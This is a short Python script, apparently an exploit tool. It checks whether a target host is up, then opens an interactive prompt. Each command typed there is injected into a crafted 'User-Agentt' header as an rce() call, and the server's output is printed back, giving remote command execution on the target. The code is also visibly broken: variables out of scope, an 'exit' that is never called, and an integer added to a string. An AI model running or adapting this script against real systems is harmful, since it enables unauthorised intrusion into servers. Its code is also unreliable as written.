#!/usr/bin/env python3
import os, re, requests


def send_request(host):
    request = requests.Session()
    response = request.get(host)

    if str(response) == '<Response [200]>':
        print("\n [+] === Host is up ===")
    else:
        print("\r")
        print(response)
        print("[!] can't connect")
        exit

def RCE(CMD):
        try:
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
            "User-Agentt": "rce('" + CMD + "');",
            "Cookie": "vo1734te=1734",
            "X-Requested-With": "XMLHttpRequest",
            
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
        except KeyboardInterrupt:
            exit


def main():
    host = "" #host
    send_request(host)
    CMD = 1
    while True:
        CMD = input("$ ")
        RCE(CMD)
        CMD +=1

if __name__ == "__main__":
	main()
